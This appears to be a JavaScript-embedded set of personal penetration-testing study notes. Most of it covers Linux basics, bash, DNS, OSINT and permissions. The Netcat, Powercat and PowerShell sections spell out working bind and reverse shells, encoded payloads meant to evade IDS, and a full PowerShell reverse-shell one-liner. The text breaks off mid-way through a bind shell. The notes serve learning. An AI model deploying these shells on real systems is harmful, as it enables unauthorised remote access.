var contents = new Array("Archive\n\r\n\rCreates a single file from many files. One archived file is bigger than the sum of the original files.      tar -cvf filearchive.tar file1 file2       file3          creating a tarball of 3 files              tar -tvf filearchive.tar       view the content of tarball             tar -xvf filearchive.tar       extract the tarball         CompressingReduce the file size\n\r    gzip, uses extension .tar.gz or .tgz    bzip2, uses extension .tar.bz2 , is the slowest, but the resultant   files are the smallest    compress, uses extension .tar.z, is the fastest, but the resultant   files are larger\n\r      gzip/bzip2/compress filearchive.*          compresses file named filearchive with any extension and replaces       that file with the compressed file                        gunzip/bunzip2/uncompress filearchive.*            uncompresses the file and is replaced with .tar file, gzip can also       extract .zip files                    Bit-by-BIt Copies\n\r\n\rdd command makes a bit-by-bit copy of a file, a filesystem, or an entire hard drive, even deleted files are copied.\n\r  dd if=inputfile   of=outputfile bs=4096 conv:noerror : noerror option continues to   copy even if errors encountered and bs allows to set the block size (no of   bytes read/written per block) default is 512 bytes, but can be changed to   speed up process and would be set to the sector size of the device. Both are   optional.\n\r\n\r\n\r","Archiving & Compressing","topics\\Archiving_&_Compressing.htm","\n\r\n\rA shell is an interface between the user and the operating system that enables you to manipulate files and run commands, utilities, programs, and much more. A number of different shells are available for Linux, including the Korn shell, the Z shell, the C shell, and the Bourne-again shell, more widely known as bash.                                                           hello.sh     .sh       extension for script file              chmod +x ./hello.sh       make the script executable            ./hello.sh     execute the script in the file hello from the current directory                         #!     tells os which interpreter to use like #! /bin/bash for bash shell       interpreter                     # comment      note explaining the code, is not read or executed by the       interpreter                  VariablesIn single quotes, bash interprets every enclosed character literally.In double quotes, all characters are viewed literally except $, meaning variables will be substituted.&nbsp;      place=\"to hell $USER\"       declaring a variable           user=$(whoami)     set       the value of the variable to the result of a command                    echo \"Welcome $place $user\"        using a variable with $VAR          Special Variables      $0     The       name of the Bash script              $1 - $9       The       first 9 arguments to the Bash script                $#     Number of arguments passed to the Bash script                $@     All       arguments passed to the Bash script               $?     The       exit status of the most recently run process                 $$     The       process ID of the current script               $USER     The       username of the user running the script                $HOSTNAME     The       hostname of the machine             $RANDOM     A       random number            $LINENO     The       current line number in the script            ArgumentsWhen running the ls -l /var/log command, both -l and /var/log are arguments to the ls command. &nbsp;            #!/bin/bash      echo \"The arg are $1 and $2\"          kali@linux:~$       ./arg.sh hello there      The       arg are hello and there      Reading User Input      echo       \"User: \"       read name      echo \"Welcome       $name\"    taking an input       from the user and assigining it to the variable       name               read -p \"User: \"       user      read -sp \"Password: \"       pass      echo \"Your creds are $user and       $pass\"          \n\r        -p allows us to specify a         prompt                 -s makes user input         silent    \n\r      If, Else &amp; Elif\n\r\n\r        &nbsp;      if [ &lt;some test&gt; ]then&nbsp;&nbsp; &lt;perform action&gt;elif [ &lt;some test&gt; ]then&nbsp;&nbsp; &lt;perform different action&gt;else&nbsp;&nbsp; &lt;perform yet another diff action&gt;fi          \n\r\n\rread -p \"Age: \" age      if [ $age -lt 16 ]           then      &nbsp;&nbsp; echo \"Access Denied\"         fi      &nbsp;            if [ $age -lt 16 ]           then      &nbsp;&nbsp; echo \"Access Denied\"         else      &nbsp;&nbsp; echo \"Welcome\"        fi      &nbsp;            if [ $age -lt 16 ]           then      &nbsp;&nbsp; echo \"Access Denied\"         elif [$age -gt 60 ]          then      &nbsp;&nbsp; echo \"Hats off to you\"           else      &nbsp;&nbsp; echo \"Welcome\"        fi      Operator     Description: Expression true if...                   !Expression     Expression is false           -n STRING      STRING length is greater than zero              -z STRING      STRING length is zero (empty)            STRING1 != STRING2     STRING1 is not equal to STRING2              STRING1 = STRING2      STRING1 is equal to STRING2             INTEGER1 -eq INTEGER2       INTEGER1 is equal to INTEGER2             INTEGER1 -ne INTEGER2       INTEGER1 is not equal to INTEGER2              INTEGER1 -gt INTEGER2       INTEGER1 is greater than INTEGER2             INTEGER1 -lt INTEGER2       INTEGER1 is less than INTEGER2             INTEGER1 -ge INTEGER2       INTEGER1 is greater than or equal to INTEGER2                INTEGER1 -le INTEGER2       INTEGER1 is less than or equal to INTEGER2                -d FILE      FILE exists and is a directory              -e FILE      FILE exists          -r FILE      FILE exists and has read permission              -s FILE      FILE exists and it is not empty               -w FILE      FILE exists and has write permission              -x FILE      FILE exists and has execute permission           Boolean Logical OperationsAND (&amp;&amp;)      echo $USER &amp;&amp; echo       $HOSTNAME &amp;&amp; echo $PWD            execute the commands one after the other                     grep kali /etc/passwd       &amp;&amp; echo \"kali found\"                 executes the next cmd only if the previous cmd succeeds (or returns       True or 0)      echo is only executed if kali user is in the /etc/passwd       file              if [ $USER == \'kali\' ]       &amp;&amp; [ $HOSTNAME == \'kali\' ]      then       &nbsp;&nbsp; echo \"Multiple       statements are true\"      fi    if both variable comparisons are true,       \"if\" line succeeds,so \"then\" branch is executed                   OR (||)\n\r\n\r      grep dev /etc/passwd       &amp;&amp; echo \"dev found\" || echo \"dev not found\"                      executes the next cmd only if the previous cmd fails (or returns       False or non-zero)      when grep doesn\'t found dev in the user file and returns false, the       2nd echo cmd after OR is executed              if [ $USER == \'kali\' ] || [ $HOSTNAME == \'dev\'       ]      then       &nbsp;&nbsp; echo \"One condition is true, this       line is printed\"      fi    if at least one variable comparison is       true, \"if\" line succeeds, so \"then\" branch is executed                       Loops\n\r\n\r        for       var-name in &lt;list&gt;      do       &nbsp;&lt;action to       perform&gt;      done          \n\r        for ip in $(seq 1 10); do         echo 10.11.1.$ip; done        for ip in         $(cat list); do echo 10.11.1.$ip; done        for ip in {1..10}; do echo 10.11.1.$ip;         done\n\r      while [ &lt;some test&gt; ]      do      &nbsp;&lt;perform an       action&gt;      done    ip=1      while [ $ip -le 10       ]      do      &nbsp;echo       \"10.11.1.$ip\"      &nbsp;((ip++))      doneFunctions\n\r\n\r        function_name () {      commands...      }    &nbsp;            return_me() {      &nbsp;echo \"Hi $1, have a number\"      &nbsp;return $RANDOM      }      return_me $USER      echo \"The number is $?\"    &nbsp;      Hi dev, have a number      The number is 47      &nbsp;      pass $USER as an argument to the function return_me, which       outputs it as $1, the funtions first arg and then return a random number       into $?      using return without $RANDOM, the exit status of the function       (zero for success, non-zero for failure) is returned            n1=\"A\"      n2=\"B\"      case_change() {      &nbsp;local n1=\"a\"      &nbsp;echo \"Inside func, n1 is $n1 and n2 is $n2\"      &nbsp;n2=\"b\"      }      echo \"Before func call, n1 is $n1 and n2 is $n2\"      case_change      echo \"After func call, n1 is $n1 and n2 is $n2\"    &nbsp;      Before func call, n1 is A and n2 is B      Inside func, n1 is a and n2 is B      After func call, n1 is A and n2 is b      &nbsp;      global variable can be accessed throughout the entire script       whereas a&nbsp; local variable can only be seen within the function in       which it is defined leaving the global variable   untouched","Bash Scripting","topics\\Bash_Scripting.htm","      [TAB]     auto complete          Ctrl+C     cancel         module\\ one OR \"module one\"         string having spaces like file name               &gt; &gt;&gt; &lt;       redirecting (to a new, to an existing, from a) file                  | (Piping)      redirecting output to another command             &gt; /dev/null      null device file discards all data written to it but reports that       the write operation succeeded                        cat ~/.bashrc      bash settings can be changed by editing .bashrc file located in any       user\'s home directory                     History\n\r\n\r      history     display history of command in a numbered list                !23     re-run the 23 command in history              history | grep phrase_to_search_for              search command history        Environment Variables      env     view default environment variables            set | less       view all env var (shell, local, cmd alias) with less because list       is long                      echo $VAR      view content of var            VAR=value     set value of a variable for current shell                export VAR      make the change permanent for any shell               export VAR=\"value\"       directly set the value of var permanently                unset VAR      delete the var and its value              alias VAR=\'command\'       create cmd alias or var for long cmd                alias     get a list of alias             unalias VAR      unset the alias cmd         PATH\n\r\n\r      echo $PATH      list dir where terminal will search for any command                 PATH=$PATH:/root/newtool     add a new dir to PATH, so as to avoid navigating to the dir       everytime you want to use the tool                          History\n\r\n\r      set | grep HISTSIZE        max no of cmds the history file stores                      HISTSIZE=0     the system won\'t store any history of       cmds now                 export HISTSIZE      makes the change permanent                \n\r        echo $HISTSIZE &gt;         ~/valueofHISTSIZE.txt \n\r        set &gt; ~/valueofALL.txt\n\r     make a backup of value of var in users       home dir before changing                   User Defined Variable\n\r\n\r        alias install=\'sudo apt-get install\'                 create new command alias or variable for long commands                   export ip=\"192.168.\"                 define a new variable for any shell               msg=\"system compromised, clear data\"              define a new variable for the current shell                unset msg      delete the var and its value           Customizing Shell\n\r\n\r      echo $$      view ID of current shell             bash     define a new shell            echo $SHELL      view the current default shell               chsh -l      list of shells already installed                 cat /etc/shells      list of available shells            chsh -s /usr/bin/fish           change default shell to fish               PS1=\'\\w$\' \'\\h$\' \'\\u$\' \'\\t$\'       \'@$\' \'!$\' \'dude$\' \'c:\\w&gt;            to change cmd prompt to dir_name$,       hostname$, username$, 24hour$, 12hour$, history_no$, dude$, windows cmd       prompt                       export PS1      to make permanent changes         ","Basic","topics\\Basic.htm","\n\r  /dev - device is where every device in   linux is represented by its own file                    File Type -  \n\r\n\r  c are character device that send and   receive data character by character, such as mice or keyboards                      b are block devices that communicate in   blocks of data (multiple bytes at a time), such as hard drives and DVD   drives                       \n\r\n\r  Logical Labels - fd0 (floppy drives), sr0   (DVD drive), hda (hard drives), sda (1st SATA hard drive), sdb (2nd SATA hard   drive) etc                              Partition - sda1 (1st pat on the 1st SATA   drive), sda2 (2nd pat) and so on                              Internal hard drives are mounted at /mnt,   and external drives at /media, though any directory can be used as mount pt                                Filesystems mounted on a system are kept   in a file at /etc/fstab (filesystem table), which is read by the system at   every bootup                        \n\r      fdisk -l      lists all the partitions of all the drives                lsblk     list       block lists info about each block devices in /dev                  mount /dev/sdb1 /mnt       mount the new hard drive sdb1 at the /mnt                 mount /dev/sdc1 /media       mount the flash drive sdc1 at the /media                umount /dev/sdb1      unmount the hard drive sdb1             df sdb      disk       free cmd gives info about size used and available                  fsck /dev/sdb1      filesystem check cmd checks for error, unmount the drive first                        du -h /home/mdx       list       the size of all the items in that directory, -h for human readable format       like kb                         du -ah /home/mdx       list       all the files and directories that exist below the specified level                      ","Device Management","topics\\Device_Management.htm","\n\r  DNS translates domain names into IP addresses.   DNS record for different domain levels (defined backwards   with . as delimiter) are located on diff authoritative name servers on the   web. Each level knows which the authoritative name servers for the next level   are.   DNS TTL (Time To Live) tells the recursive server or local   resolver how long it should keep DNS record in its cache.\n\r      node1           www, mail, maps        cluster          google      example          com      org    .         host     sub-domain     2nd level domain       Top Level Domain (TLD)        root level          individual machine      subdomains are seen       by search engines as different websites    DNS server provides IP address of its       subdomains which includes the organisations web servers, mail servers etc                           TLD servers provide the IP addresses for       authoritative DNS name servers (NS)                Root name servers provides the IP       addresses of the TLD name servers                   DNS records      NS     Nameserver records      contains the name of the authoritative servers hosting the DNS       records for a domain                      A     a       record      contains the IP address of a hostname               MX     Mail Exchange records       names of the servers responsible for handling email                PTR     Pointer Records      used in reverse lookup zones and are used to find the records       associated with an IP address                         CNAME     Canonical Name Records       used to create aliases for other host records                TXT     Text records      any arbitrary data        ","DNS","topics\\DNS.htm","\n\r\n\rwget : download files using the HTTP/HTTPS and FTP protocols, use -O (capital) switch to save the file with a diff name                    \n\r  wget -O report.pdf https://www.offensive-security.com/reports-sampte-2813.pdf\n\r  wget www.churchofsatan.com downloads the   webpage\n\r\n\r\n\rcurl : transfer data to or from a server using a host of protocols including IMAP/S, POP3/S, SCP, SFTP, SMB/S, SMTP/S, TELNET etc\n\r  curl -o report.pdf https://www.offensive-security.com/reports-sampte-2813.pdf\n\r\n\r\n\raxel : download accelerator that transfers a file from a FTP or HTTP server through multiple connections, -n to specify the number of multiple connections, -a for a more concise progress indicator and -o different file name for the downloaded file.\n\r  axel -a -n 20 -o report.pdf   https://www.offensive-security.com/reports-sampte-2813.pdf\n\r","Downloading Data","topics\\Downloading_Data.htm","#!/bin/bash&nbsp;# Arg 1 = CIDR (IP/Subnet)# Agr 2 = Port&nbsp;# Scanning a subnet to look for web servers# -A for aggressive scanning, -p to specify port, --open to only return machine with open port, -oG to save scan in greppable formatsudo nmap -A -p$2 --open $1 -oG nmap-scan&nbsp;# Using cutycapt to capture screenshots from all web serversfor ip in $(cat nmap-scan | grep $2 | grep -v \"Nmap\" | awk \'{print $2}\')do &nbsp; cutycapt --url=$ip --out=$ip.pngdone&nbsp;# Creating a page to look at all the images from our scan resultsecho \"&lt;HTML&gt;&lt;BODY&gt;&lt;BR&gt;\" &gt; web.htmlls -1 *.png | awk -F : \'{ print $1\":\\n&lt;BR&gt;&lt;IMG SRC=\\\"\"$1\"\"$2\"\\\" width=600&gt;&lt;BR&gt;\"}\' &gt;&gt; web.htmlecho \"&lt;/BODY&gt;&lt;/HTML&gt;\" &gt;&gt; web.html","Examine Ports Thru HTML","topics\\Examine_Ports_Thru_HTML.htm","Navigation      pwd     print working directory           cd /etc      change to the etc directory             cd ..       move up one level            ls /etc -al       display a (-l) long listing with permission (-a) of all files       including hidden ones in etc directory                              Create, Copy &amp; Remove      mkdir Index      make a directory named Index             mkdir -p test/{recon,exploit,report}             make a parent dir containing 3 sub-directories               cp Index /etc/Index1       copy file Index to the dir etc and rename it to Index1                    mv Index /etc/Index1       move file Index to the dir etc and rename it to Index1                    mv Index Index1       rename file Index to Index1             rm index.txt      remove file          rmdir Index      remove dir, should be empty             rm -rf Index       remove dir and its content                 Creating &amp; Viewing      head -20 index.txt       display first 20 lines of the file               tail -20 index.txt       display last 20 lines             tail -f /var/log/apache2/access.log             continuously updates the output as the target file grows                   nl index.txt      display file with line number             less index.txt      displays a page of a file at a time, press / to search a term                             touch index      creates a new file named index              nano index            \n\r                open a file in nano (text editor) or create a new one if it         doesn\'t exist                ctrl+O to write changes to file                ctrl+X to exit\n\r        vi index            \n\r        vi is a powerful text editor         Press \"i\" key to enable insert-text mode and start         typing         Esc to disable insert-text mode and enter command mode,         in this mode use         \"x\"-delete character         \":w\"-write to disk         \":q!\"-quit without saving         \":wq\"-save and quit\n\r        cat index      show the content of file index              cat &gt; index       create a file or overwrite the existing file with new content,       press ctrl+D to save and exit                         cat &gt;&gt; index       add more content to file, can\'t edit the existing content                    echo \"string\" &gt; index.txt        create a file \"index\" containing \"string\" or replace a existing       file                   echo \"string\" &gt;&gt; index.txt            append additional data to an existing       file                                   Comparing Files      comm log_1 log_2       compares two text files and outputs three columns: lines unique to       the first file, lines unique to the second file and lines shared by both       files                                  comm -12 log_1 log_2        suppresses 1st &amp; 2nd columns and only displays lines common in       both files                     diff -u log_1 log_2              \n\r        detects diff between files             output uses \'-\' to show line that         appear in 1st file but not in 2nd and \'+\' to show lines that appear in         2nd but not in 1st                                    \n\r        vimdiff log_1 log_2             \n\r        vimdiff opens vim (extention of         vi) with multiple files with the differences highlighted.                              ctrl+W followed by arrow key to         switch between window.                          ] c: jumps to the next change                                  [ c: jumps to the previous change                                  do: gets changes from the other         window into the current one                          dp: puts the changes from the         current window into the other one                          quit: same as   vi\n\r      Manipulating String      cat index 2&gt; error.txt        index doesn\'t exit so we get an error msg and it gets stored in a       file error, a program run from cmd line has 3 data streams each with its       own num [ Standard Input_STDIN-0, STDOUT-1, STDERR-2 ]                                              sed s/mysql/MySQL/g /etc/index &gt;       index1            replace every occurrence of mysql with MySQL and then save the new       file to index1                       wc -l index.html       count number of lines in file, -m to count the characters                     ls -la /usr/bin | grep zip          search for any file in /usr/bin containing zip                ls -la /usr/bin | grep zip | grep -v       \"2010\"              -v       is a reverse-grep showing only lines that do not match the string                         grep -o \'[^/,\"]*\\.megacorpone\\.com\'       index.html              \n\r        -o to print only the matched part of a matching         line         /         and \" is inculded in a negated (^) set ([])         searches for any no of characters         (*) not including / and         \"         periods are escaped         with (\\.), meaning we are looking for a literal         period\n\r        cat access.log | cut -d \" \" -f 1                 cut       (-d: field delimiter is what separates a field, -f: field no to cut)                            cat access.log | awk -F \"http://\" \'{print       $1, $3}\'                   \n\r        -F is field seperator and cut and print 1st &amp; 3rd         field         awk can have multi character delimiter whereas cut has         single\n\r        cat access.log | sort -ur         sort alphabetically, -u remove duplicates, -r display in reverse       order, -n to sort numerically                      cat access.log | sort | uniq -c                 \n\r        uniq removes duplicate lines adjacent to each other, -c         displays count of no of times a line is repeated         uniq is used after sort so that duplicates are adjacent         to each other          \n\r        cat access.log | sort | uniq -c | sort       -urn              count occurence and sort them from most common to least                ","File Management","topics\\File_Management.htm","\n\r\n\r        &nbsp;/    main       directory at the top&nbsp;          /bin&nbsp;    essential       command binaries like ls, cd, cat                  &nbsp;/boot    static       files of the boot loader, contains kernel image&nbsp;                    &nbsp;/dev    device       files&nbsp;                   &nbsp;/etc    host-specific system config&nbsp;              &nbsp;/home    user home       directories&nbsp;            &nbsp;/lib    essential       shared libraries and kernel modules&nbsp;                 &nbsp;/media    contains       mount point for replaceable media like CDs and Pendrive&nbsp;                     &nbsp;/mnt    mount pt       for mounting a file system temporarily&nbsp;                   &nbsp;/proc    &nbsp;view       of internal kernel data                &nbsp;/root    home dir       for the root user&nbsp;                 &nbsp;/run    run-time       variable data&nbsp;            &nbsp;/sbin    &nbsp;essential system binaries like fdisk, mkfs,   sysctl                  &nbsp;/sys    &nbsp;kernel\'s view of the hardware                &nbsp;/tmp    temporary       files&nbsp;           &nbsp;/usr    secondary       hierarchy contains /usr/bin, /usr/lib, /usr/share/doc&nbsp;                 &nbsp;/var    variable       data&nbsp;         &nbsp;/srv    &nbsp;data       for services provided by the system                        \n\r\n\r&nbsp;/opt    add-on       application software packages&nbsp;         ","File Structure","topics\\File_Structure.htm","\n\r\n\rReads and writes data across network connections, using TCP or UDP protocols.\n\r\n\r        nc       -nv 10.11.0.22 110    connect to TCP port 110 (POP3 mail server) on       10.11.0.22, -n to skip DNS name resolution, -v to add verbosity, if the       port is open the server responds with welcome message and prompt us to log       in&nbsp;      nc       -nlvp 4444&nbsp;    listen for incoming connection on TCP port       4444, -l to listen, -p to specify port no&nbsp;Transfer Files\n\r\n\r        c:\\win&gt; nc -nlvp 4444 &gt;       incoming.exe&nbsp;          on       windows set up a listener and redirect output to file   incoming.exe      kali@linux:~$ nc -nv 10.11.0.22 4444 &lt;       /usr/share/windows-resources/binaries/wget.exe&nbsp;    transfer file wget.exe from linux to       windows&nbsp;&nbsp;Bind Shell\n\r\n\rListener on target and attacker connect to target to gain remote shell.\n\r\n\r        c:\\target&gt; nc -nlvp 4444       -e cmd.exe          -e       executes a program after making or receiving a successful       connection&nbsp;      kali@attacker:~$ nc -nv       10.11.0.22 4444&nbsp;          after       connecting linux is presented with win\'s command   prompt&nbsp;Reverse Shell\n\r\n\rListener on attacker and target connects to listener with a shell.\n\r\n\rThis helps when target is behind a NAT, having a private IP address and behind a firewall.\n\r\n\r        c:\\atk&gt; nc -nlvp 4444&nbsp;    win attacker runs a listener&nbsp;      kali@trgt:~$ nc -nv 10.11.0.22 4444 -e       /bin/bash&nbsp;    linux target connects to the attacker and       after connection win is presented with kali bash shell&nbsp;","Netcat","topics\\Netcat.htm","      ifconfig         to get network info            iwconfig         info about wireless adapter            eth0     Ethernet interface      first wired network connection, if there       were more they would show up as eth1, eth2, and so on                          HWaddr     Hardware address       media access control (MAC) address, a       unique address stamped on every piece of network hardware, the network       interface card (NIC)                            inet addr      IP address              Bcast     Broadcast address      address used to send out information to       all IPs on the subnet                    Mask     Network Mask              lo     Loopback address/Localhost      address that connects you to your own       system                wlan0     Wireless interface or adapter                SSH     Secure Shell      TCP-based service to remotely access a       pc                HTTP     Hypertext Transfer Protocol       TCP-based service to host a site or       download files               Changing Network Info      ifconfig eth0 192.168.181.115       netmask 255.255.0.0 broadcast 192.168.1.255           changes the IP, netmask and broadcast       address for an interface.                   dhclient eth0      get a new IP, netmask, broadcast address       for an interface from the DHCP server                    Use wlan0 for wireless interfaceMAC Spoofing\n\r    ifconfig   eth0 down    ifconfig eth0 hw ether   00:11:22:33:ab:bb    ifconfig eth0   up\n\rChanging the DNS Server\n\r    nano   /etc/resolv.conf and add nameserver&nbsp;   8.8.8.8\n\r    echo \"nameserver 8.8.8.8\"   &gt; /etc/resolv.conf to replace the existing   one\n\r    The OS queries each DNS server listed in the order it   appears\n\r    DHCP server will replace the contents of the file when it renews the   IP\n\rMapping IP address \n\r    nano /etc/hosts   and add any IP address mapped to any domain like \"192.168.181.131[TAB]bankofindia.com\"\n\r","Network Info","topics\\Network_Info.htm","Whois      whois churchofsatan.com      basic info about domain name             whois 38.100.193.70      reverse lookup to get more info about an IP               dig\n\r\n\r      dig google.com      get       the IP address            dig google.com ns       get       the nameserver           dig google.com mx       get       the mail exchange server           Google Hackinghttps://www.exploit-db.com/google-hacking-database\n\r\n\r      site:churchofsatan.com         limit the search to churchofsatan.com and       subdomains               site:churchofsatan.com       filetype:php      locate PHP files (login pages) on       churchofsatan.com               site:churchofsatan.com ext:jsp                  index Java Server Pages, cfm-Coldfusion, pl-Perl      ext and filetype operator are the same        site:churchofsatan.com       -filetype:html      exclude HTML pages           intitle:\"index of\" \"parent       directory\"        pages having \"index of\" in the title and       the words \"parent directory\" on the page                       allinurl:apple satan      results having all the specified words in       the URL               Email Harvesting\n\r\n\r        theharvester -d   churchofsatan.com -b google                &nbsp;&nbsp;    -d to specify target domain, -b to set the data source to     search&nbsp;  Recon-ng\n\r\n\r      kali@kali:~$ recon-ng          run recon-ng          [recon-ng][default] &gt;       marketplace search github         search marketplace for github modules                   https://github.com/lanmaster53/recon-ng-marketplace/wiki/API-Keys           modules with an asterisk in the K column       require credentials or API keys                     [r][d] &gt; marketplace info       recon/domainshosts/google_site_web         gives description about the module                  [r][d] &gt; marketplace       install recon/domainshosts/google_site_web         install the module           [r][d] &gt; marketplace load       recon/domainshosts/google_site_web         load the module           [r][d][g] &gt; info       gives info about the module like       \"options\"               [r][d][g] &gt; options set       SOURCE churchofsatan.com           change the SOURCE options from default to       a website (string)                  [r][d][g] &gt; run       running the module updates the \"hosts\"       table                [r][d][g] &gt; back       to go back           [r][d] &gt; show       gives info about using \"show\"                [r][d] &gt; show hosts                   show the \"hosts\" table      the host column contains the subdomains of       churchofsatan.com        [r][d] &gt; marketplace load       recon/hosts-hosts/resolve               this module resolves the IP address for a host      in SOURCE = default uses the host from the \"hosts\" table having no       IP        [r][d][r] &gt; run       running with SOURCE = default updates the IP column of hosts table             Websites\n\r\n\r      https://osintframework.com           list of OSINT tools            https://searchdns.netcraft.com           provides a site report containing       registration info and various \"site technology\" entries                    https://www.shodan.io               search engine that crawls devices connected to the       Internet      hostname:churchofsatan.com        https://securityheaders.com           analyze HTTP response headers              https://www.ssllabs.com/ssltest     analyzes a server\'s SSL/TLS configuration                   https://pastebin.com     website for storing and sharing text                    https://www.social-searcher.com     social media search engine            ","OSINT","topics\\OSINT.htm","\n\r  User who created the file is the owner of that   file.   ls -l : display the permissions of files            - (file), d (directory), l (link), r (read), w (write), x   (execute)   There are three sets of rwx. The sets represents the   permissions on the file for user (or owner), groups, and others ,   respectively\n\r      -, d, l       rwxrw-r--     3     root     root     42069     Aug 6 4:20       cooking guide          File Type      Permission     No. of links       User owning the file        Grp owning the file         File size      Last modification date       File name       Representation of Permission            \n\r\n\rrwx     Binary     Octal         ---     000     0         --x     001     1         -w-     010     2         -wx     011     3         r--     100     4         r-x     101     5         rw-     110     6         rwx     111     7       Granting Permissions      chown mridul /tmp/mridulsfile       chown (change owner) grants the user Mridul ownership of       mridulsfile                  chgrp security newIDS       chgrp (change group) grants the group security ownership of       newIDS               Changing Permissions      chmod 774 file.py       chmod (change mode) gives the owner and       group all the permissions and everyone else only the read permission                                chmod u+x, go+rw file.py                    \n\r                add (+) the execute (x) permission for         user (u) and rw for group (g) and others (o)                u         (user or owner), g (group), o (others)                - (removes a permission), + (adds), =                 (sets)\n\r      Default Permissions            \n\r\n\rNew Files            \n\r\n\rNew Directories                    \n\r\n\r6 6 6             \n\r\n\r7 7 7             \n\r\n\rLinux Base Permissions                 \n\r\n\r- 0 2 2              \n\r\n\r- 0 2 2              \n\r\n\rumask               \n\r\n\r6 4 4             \n\r\n\r7 5 5             \n\r\n\rResulting Permissions        \n\r  umask method represents the   permissions you want to remove from the base permissions on a file or   directory.  Each user can set a personal   default umask value for the files and directories in their personal .profile   file at /home/username/.profile\n\rSpecial PermissionsSet User ID (SUID) (-rws)\n\r\n\rSUID allows any user to execute the file with the permissions of the owner but those permissions don’t extend beyond the use of that file.\n\r    chmod 4644 filename :   a 4 before the regular permissions sets the SUID   bit    find / -user root -perm -4000 : to search   from the top of the file system (/) for files owned by root having the SUID   permission.    /etc/shadow (holds the   users\' passwords), /usr/bin/sudo have SUID bit\n\r\n\r\n\rUpdating a user\'s password requires the user to edit the /etc/passwd, /etc/shadow file. As root is the owner of that file, and SUID being set on that file, any user executing the /usr/bin/passwd command will execute it as root user.\n\r\n\rAny user can run the sudo command with the permission of the root (password of the root).Set Group ID (SGID)\n\r\n\rSGID is similar to SUID as in someone without execute permission can execute a file if the owner belongs to the group that has permission to execute that file. \n\r    chmod 2644 filename : a 2 before the regular permissions sets the SGID   bit\n\r\n\r\n\r&nbsp;","Permissions","topics\\Permissions.htm","\n\r\n\rNetcat for PowerShell\n\r  apt install   powercat &gt; script will be placed in /usr/share/windows-resources/powercat in kali   &gt; transfer to windows\n\rLoading the script\n\r  loading a local PowerShell script using dot   sourcing  \n\r\n\r\n\r        ../powercat.ps1\n\r  loading a remote PowerShell script using   iex  \n\r\n\r\n\r        iex (New-Object       System.Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1\')&nbsp;File Transfer\n\r\n\r        kali@linux:~$ sudo nc -lnvp 443 &gt;       receiving_powercat.ps1&nbsp;    creating a listener on kali to recieve     file&nbsp;      PS       c:\\win&gt; powercat -c 10.11.0.4 -p 443 -i     c:\\powercat.ps1&nbsp;          -c       for client mode and listener\'s IP, -p for port and -i to specify file       path      -l       to create a listener&nbsp;Reverse Shell\n\r    kali@attacker:~$ sudo nc -lvp 443    PS c:\\target&gt;   powercat -c 10.11.0.4 -p 443 -e cmd.exe\n\rBind Shell\n\r    PS c:\\target&gt; powercat -l -p 443   -e cmd.exe    kali@attacker:~$   nc 10.11.0.22 443\n\rStand-Alone Payloads\n\r\n\r        kali@attacker:~$ sudo nc -lnvp     443&nbsp;    kali started a listener&nbsp;      PS       c:\\win&gt; powercat -c 10.11.0.4 -p 443 -e cmd.exe -g &gt;       reverseshell.ps1&nbsp;    -g to create a stand-alone payload and       redirect the output to a file&nbsp;      PS       c:\\target&gt; ./reverseshell.ps1&nbsp;    when executed kali will have remote access to       cmd&nbsp;      PS       c:\\win&gt; powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge &gt;       encodedreverseshell.ps1&nbsp;    -ge to create a Base64 encoded payload to       avoid detection by IDS and redirect the output to a file&nbsp;&nbsp;      PS       c:\\target&gt; powershell.exe -E SCRIPT&nbsp;    to execute an encoded script open it in a       text editor and copy &amp; paste the SCRIPT&nbsp;","Powercat","topics\\Powercat.htm","\n\r\n\rWindows PowerShell is a task-based command line shell and scripting language.           \n\r  PS   c:\\win&gt; PowerShell Prompt, c:\\win&gt; Command Prompt             PowerShell execution policy determine   which PowerShell scripts can be run. The default policy is \"Restricted\",   meaning the system will neither load PowerShell configuration files nor run   PowerShell scripts.             Run   as Administrator &gt; PS c:\\win&gt; Set-ExecutionPolicy   Unristricted             PS c:\\win&gt; Get-ExecutionPolicy : to check the current execution   policy                   \n\rDownloading File\n\r\n\rkali@linux:~$ sudo cp /usr/share/windows-resources/binaries/wget.exe /var/www/html/    \n\r    copy the   wget file to be transfered      \n\rkali@linux:~$ sudo systemctl start apache2    \n\r  starts the apache2 html web   server     \n\r  \n\r\n\rc:\\win&gt; powershell -c \"(new-object System.Net.WebClinet).DownloadFile(\'http://10.11.0.4/wget.exe\',\'c:\\Users\\Desktop\\wget.exe\')\"     \n\r    -c to execute the command (in double-quotes) as if it were typed at the   PowerShell prompt.     \n\r    new-object cmdlet allows to instantiate either a .Net Framework or a   COM object.     \n\r    WebClient class, in the System.Net namespace. The WebClient class is   used to access resources identified by a URL.     \n\r    DownloadFIle method in WebClient class, which requires a source and a   target location.     \n\rReverse Shell\n\r    kali@attacker:~$ sudo nc -lnvp   443\n\r    c:\\target&gt;   powershell -c \"$client = New-Object   System.Net.Sockets.TCPClient(\'l0.ll.0.4\',443);$stream =   $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =   $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName   System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data   2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'&gt;   \';$sendbyte =   ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n\r\n\r\n\r              $client = New-Object       System.Net.Sockets.TCPClient(\'l0.ll.0.4\',443);      $stream =       $client.GetStream();      [byte[]]$bytes =       0..65535|%{0};      while(($i = $stream.Read($bytes, 0,       $bytes.Length)) -ne 0)      {      $data = (New-Object -TypeName       System.Text.ASCIIEncoding).GetString($bytes,0, $i);      $sendback = (iex $data 2&gt;&amp;1 |       Out-String );      $sendback2 = $sendback + \'PS \' +       (pwd).Path + \'&gt; \';      $sendbyte =       ([text.encoding]::ASCII).GetBytes($sendback2);      $stream.Write($sendbyte,0,$sendbyte.Length);      $stream.Flush();      }      $client.Close();&nbsp;      client       variable (target IP, Port), stream variable, byte array called bytes, while loop (iex cmdlet runs any string it receives as       a command and the results are then sent back via the data stream) and a       call to close the client connection.&nbsp;&nbsp;Bind Shell\n\r    c:\\target&gt; powershell -c   \"$listener = New-Object   System.Net.Sockets.TcpListener(\'0.0.0.0\',443);$listener.start();$client =   $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes =   0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne   0){;$data = 